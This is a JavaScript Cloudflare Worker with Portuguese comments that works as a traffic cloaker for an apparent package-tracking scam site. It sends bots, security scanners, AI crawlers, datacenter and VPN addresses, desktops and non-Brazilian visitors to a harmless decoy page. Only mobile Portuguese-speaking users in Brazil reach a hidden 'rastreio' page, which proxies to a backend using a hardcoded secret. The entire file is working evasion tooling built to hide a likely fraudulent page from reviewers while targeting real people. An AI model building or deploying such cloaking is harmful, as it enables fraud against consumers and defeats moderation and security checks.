/**
 * _worker.js — Cloudflare Worker
 * Roteador de rastreio + cloaker white/black.
 * runtime: Cloudflare Workers (ESM), compatibility_date 2024-09-23
 *
 * Fluxo:
 *   /                       -> white (index.html)
 *   /rastreio               -> black  (rastreio.html)  [só mobile + BR + humano]
 *   /rastreio/CODIGO        -> black  (injeta ?codigo=)
 *   /CODIGO                 -> redireciona pro black (ou white, se falhar no filtro)
 *   /api/tracking/*         -> proxy pro backend
 *
 * Quem falha no filtro cai em "/" via 302.
 */

const WHITE_PATH = '/';

// Atalho: navegação vinda da própria white page passa pelo gate de dispositivo.
// Sem isso o formulário da home não funciona (o usuário volta pra home em loop).
const ALLOW_FROM_WHITE = true;

// 1 = escreve o motivo do bloqueio no header x-cloak (debug). 0 = silencioso.
const CLOAK_DEBUG = false;

// ---------------------------------------------------------------------------
// Assinaturas
// ---------------------------------------------------------------------------

const BOT_RE = /(bot|crawl|spider|slurp|archiver|scrap|preview|fetch|monitor|checker|validator|headless|phantom|selenium|puppeteer|playwright|lighthouse|pagespeed|gtmetrix|pingdom|uptime|curl\/|wget|python-requests|python-urllib|aiohttp|httpx|go-http-client|java\/|okhttp|axios|node-fetch|undici|libwww|httpclient|gptbot|chatgpt|claude-web|anthropic|perplexity|ccbot|bytespider|semrush|ahrefs|mj12|dotbot|petalbot|yandex|baidu|sogou|exabot|applebot|facebookexternalhit|facebot|whatsapp|telegram|discord|slackbot|twitterbot|linkedinbot|embedly|pinterest|redditbot|bingpreview|google-inspectiontool|apis-google|mediapartners)/i;

const MOBILE_RE = /(iphone|ipod|ipad|android|mobile|opera mini|iemobile|blackberry|bb10|playbook|silk|kindle|webos|windows phone|palm|series60|symbian|fennec)/i;

// ASN de datacenter / VPS / VPN. É o filtro mais agressivo daqui — se aparecer
// falso positivo (usuário real caindo na white), corte o termo culpado.
const DATACENTER_RE = /(digitalocean|amazon|aws|google llc|google cloud|microsoft|azure|hetzner|ovh|contabo|linode|vultr|scaleway|oracle|alibaba|tencent|choopa|leaseweb|m247|datacamp|hostinger|namecheap|godaddy|ionos|rackspace|equinix|fastly|akamai|cloudflare|server|hosting|datacenter|data center|colo(cation)?\b|vpn|proxy|nordvpn|expressvpn|surfshark|cyberghost|mullvad|private internet|tor exit)/i;

const DESKTOP_PLATFORM_RE = /(windows|macos|mac os|linux|chrome os|chromium os)/i;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const deny = (reason) => ({ allow: false, reason });
const pass = (reason) => ({ allow: true, reason });

function isBlackPath(pathname) {
  return (
    pathname === '/rastreio' ||
    pathname === '/rastreio/' ||
    pathname === '/rastreio.html' ||
    pathname === '/result-template.html' ||
    pathname.startsWith('/rastreio/')
  );
}

/**
 * Decide se a requisição pode ver a página preta.
 * @returns {{allow: boolean, reason: string}}
 */
function evaluate(request, url) {
  const h = request.headers;
  const cf = request.cf || {};
  const ua = h.get('user-agent') || '';
  const country = cf.country || h.get('cf-ipcountry') || '';
  const lang = (h.get('accept-language') || '').toLowerCase();
  const chMobile = h.get('sec-ch-ua-mobile');
  const chPlatform = (h.get('sec-ch-ua-platform') || '').toLowerCase();

  // --- gates duros -------------------------------------------------------
  if (!ua) return deny('no-ua');
  if (BOT_RE.test(ua)) return deny('bot-ua');

  if (cf.verifiedBot) return deny('verified-bot');
  if (cf.botManagement && cf.botManagement.verifiedBot) return deny('verified-bot');
  if (cf.botManagement && typeof cf.botManagement.score === 'number' && cf.botManagement.score < 30) {
    return deny('bot-score');
  }
  if (typeof cf.clientTrustScore === 'number' && cf.clientTrustScore < 20) {
    return deny('low-trust');
  }

  if (country && country !== 'BR') return deny('geo');

  const asn = cf.asOrganization || cf.asnOrganization || '';
  if (asn && DATACENTER_RE.test(asn)) return deny('datacenter');

  // --- exceção: quem clicou num link da própria white page -----------------
  if (ALLOW_FROM_WHITE) {
    const referer = h.get('referer') || '';
    const site = h.get('sec-fetch-site');
    if (referer && site !== 'cross-site' && site !== 'none') {
      try {
        const r = new URL(referer);
        if (r.origin === url.origin && (r.pathname === '/' || r.pathname === '/index.html')) {
          return pass('from-white');
        }
      } catch (_) {
        /* referer inválido — segue pro gate de dispositivo */
      }
    }
  }

  // --- dispositivo --------------------------------------------------------
  if (chMobile === '?0') return deny('desktop-hint');
  if (chMobile === '?1') {
    if (DESKTOP_PLATFORM_RE.test(chPlatform) && !/android/i.test(ua) && !/iphone|ipad/i.test(ua)) {
      return deny('desktop-platform');
    }
  } else if (!MOBILE_RE.test(ua)) {
    return deny('desktop-ua');
  }

  // --- idioma -------------------------------------------------------------
  if (lang && !/(^|,)\s*pt/.test(lang)) return deny('lang');

  return pass('ok');
}

function redirectWhite(url, verdict, debug) {
  const headers = {
    Location: url.origin + WHITE_PATH,
    'Cache-Control': 'no-store, no-cache, must-revalidate, private',
    'X-Robots-Tag': 'noindex, nofollow, noarchive',
    Vary: 'User-Agent, Accept-Language, Sec-CH-UA-Mobile, Sec-CH-UA-Platform, Referer',
  };
  if (debug) headers['X-Cloak'] = 'deny:' + verdict.reason;
  return new Response(null, { status: 302, headers });
}

async function serveBlack(request, url, env, verdict, debug) {
  const assetUrl = new URL(url.origin);
  assetUrl.pathname = '/rastreio.html';

  const search = new URLSearchParams(url.search);

  // /rastreio/AA123456789BR -> ?codigo=AA123456789BR
  const pathCode = url.pathname.match(/^\/rastreio\/([A-Za-z0-9]{6,32})\/?$/);
  if (pathCode && !search.has('codigo')) {
    search.set('codigo', pathCode[1].toUpperCase());
  }
  const qs = search.toString();
  assetUrl.search = qs ? '?' + qs : '';

  const assetReq = new Request(assetUrl.toString(), {
    method: request.method,
    headers: request.headers,
  });

  const res = await env.ASSETS.fetch(assetReq);

  const headers = new Headers(res.headers);
  headers.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  headers.set('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet');
  headers.set('Vary', 'User-Agent, Accept-Language, Sec-CH-UA-Mobile, Sec-CH-UA-Platform, Referer');
  headers.set('X-Content-Type-Options', 'nosniff');
  if (debug) headers.set('X-Cloak', 'allow:' + verdict.reason);

  return new Response(res.body, { status: res.status, headers });
}

// ---------------------------------------------------------------------------

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const debug = CLOAK_DEBUG || env.CLOAK_DEBUG === '1';

    if (request.method === 'OPTIONS') {
      return new Response(null, {
        status: 204,
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
        },
      });
    }

    // --- proxy do backend --------------------------------------------------
    if (url.pathname.startsWith('/api/tracking')) {
      const backendBaseUrl = (env.BACKEND_API_URL || 'https://jetlogs.shop').replace(/\/+$/, '');
      const facadeSecret = env.FACADE_SECRET || 'jetlogs-facade-shield-token-2026';
      const targetUrl = `${backendBaseUrl}${url.pathname}${url.search}`;

      const forwardHeaders = new Headers(request.headers);
      forwardHeaders.set('host', new URL(backendBaseUrl).host);
      if (facadeSecret) forwardHeaders.set('x-facade-secret', facadeSecret);

      const backendResponse = await fetch(targetUrl, {
        method: request.method,
        headers: forwardHeaders,
        body: request.method !== 'GET' && request.method !== 'HEAD' ? request.body : undefined,
      });

      const cleanHeaders = new Headers();
      cleanHeaders.set('Content-Type', backendResponse.headers.get('content-type') || 'application/json; charset=utf-8');
      cleanHeaders.set('Access-Control-Allow-Origin', '*');
      cleanHeaders.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
      cleanHeaders.set('X-Content-Type-Options', 'nosniff');

      return new Response(backendResponse.body, {
        status: backendResponse.status,
        headers: cleanHeaders,
      });
    }

    if (!env.ASSETS) {
      return new Response('Not found', { status: 404 });
    }

    const verdict = evaluate(request, url);

    // --- página preta (cloak) ----------------------------------------------
    if (isBlackPath(url.pathname)) {
      if (!verdict.allow) return redirectWhite(url, verdict, debug);
      return serveBlack(request, url, env, verdict, debug);
    }

    // --- código na raiz: /AA123456789BR ------------------------------------
    if (url.pathname !== '/') {
      const isStaticFile = /\.[a-z0-9]{2,5}$/i.test(url.pathname);
      if (isStaticFile) return env.ASSETS.fetch(request);

      const cleanCode = url.pathname.replace(/^\/+/, '').replace(/\/+$/, '');
      if (/^[A-Z0-9]{8,25}$/i.test(cleanCode)) {
        if (!verdict.allow) return redirectWhite(url, verdict, debug);
        return Response.redirect(
          `${url.origin}/rastreio?codigo=${encodeURIComponent(cleanCode.toUpperCase())}`,
          302,
        );
      }

      return Response.redirect(`${url.origin}/`, 302);
    }

    return env.ASSETS.fetch(request);
  },
};
